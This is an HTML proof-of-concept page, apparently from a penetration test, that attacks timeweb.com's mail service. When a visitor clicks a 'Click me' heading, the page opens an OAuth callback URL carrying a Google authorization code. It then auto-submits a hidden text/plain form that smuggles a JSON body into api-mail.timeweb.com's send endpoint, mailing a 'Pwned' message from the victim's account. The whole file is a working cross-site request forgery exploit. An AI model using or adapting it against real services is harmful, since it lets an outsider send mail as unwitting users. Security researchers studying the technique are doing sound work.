<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <script>

        window.addEventListener("message", (e) => {
            console.log(e?.data);
        }, false);

    </script>
</head>
<body>
<!--<script>history.pushState('', '', '/')</script>-->
<script>

    function go(){
        let w = window.open("https://hosting.timeweb.ru/ru/community/user/auth/gg?code=4%2F0AbUR2VPGOZ_41UtKatp7tI0UX6C7ZV2TmrIPkmaqhvqo259Qbthdj7pmcu6cpTt4h7RvmQ&scope=email+profile+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile+openid&authuser=0&prompt=consent",'');
        setTimeout(function(){
            w.close();
            document.getElementsByName('csrf')[0].submit();
        },1000)
    }
</script>

<h1 onclick=go()>Click me</h1>
<form style="display:none" name=csrf
      enctype="text/plain"
      method=post action="https://api-mail.timeweb.com/message/send">

    <input
            hidden="true"
            type="text"
            name="{&quot;attachments&quot;:[],&quot;bcc&quot;:[],&quot;cc&quot;:[],&quot;text&quot;:&quot;1&quot;,&quot;htmlText&quot;:&quot;Pwned&quot;,&quot;subject&quot;:&quot;Pwned&quot;,&quot;to&quot;:[&quot;zero.0x00.pentest_04@twmail.ru&quot;],&quot;from&quot;:[],&quot;replyMessageId&quot;:0,&quot;resendMessageIds&quot;:[],&quot;resendAttachments&quot;:[],&quot;pwned"
            value="&quot;:1}"
    >
    <input type=submit>
</form>


</body>
</html>
